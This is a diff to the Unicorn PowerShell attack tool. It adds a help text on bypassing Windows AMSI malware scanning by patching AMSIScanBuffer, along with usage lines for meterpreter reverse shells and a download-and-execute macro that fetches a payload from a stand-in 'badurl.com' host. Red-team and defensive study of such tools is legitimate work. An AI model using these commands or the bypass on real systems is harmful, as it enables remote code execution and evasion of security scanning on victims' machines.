@@ -142,6 +142,36 @@ aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2Vl
                 """)
 
 
+# display amsi help
+def amsi_help():
+    print("""
+[*******************************************************************************************************]
+
+                                  -----AMSI BYPASS INFORMATION----
+
+
+For a full writeup of this technique and how it works, visit the original research from these locations:
+
+https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
+
+https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
+
+The way this works in Unicorn is by appending the bypass technique by disabling AMSI through patching and
+disabling the AMSIScanBuffer functionality. In Unicorn this is an optional flag and can be turned off by
+editing the unicorn.py file and turning AMSI_BYPASS="ON" to "OFF". The main trade-off with this technique
+is that although it turns off AMSI when it's going to scan, it also increases the length of the payload
+substantially. If you are working with cmd.exe as a method for a one liner powershell command, this will
+increase the size of the payload more than the 8191 character size restriction. This means that when you
+go to run this, you will need to do it directly through powershell.exe and not cmd.exe. 
+
+[*******************************************************************************************************]
+
+    """)
+
+
+
+
+
 # display macro help
 def macro_help():
     print("""
@@ -462,7 +492,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.5.2 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.5.3 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -472,6 +502,7 @@ def gen_usage():
     print("Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>")
     print("PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443")
     print("PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe")
+    print("PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro")
     print("Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro")
     print("Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro")
     print("Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro")
@@ -1215,6 +1246,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
             write_file("powershell_attack.txt", full_attack)
             if attack_modifier != "dde":
+                if AMSI_BYPASS.lower() == "on": amsi_help() # print the AMSI bypass language
                 ps_help() # present normal powershell attack instructions
 
             # if we are using dde attack, present that method
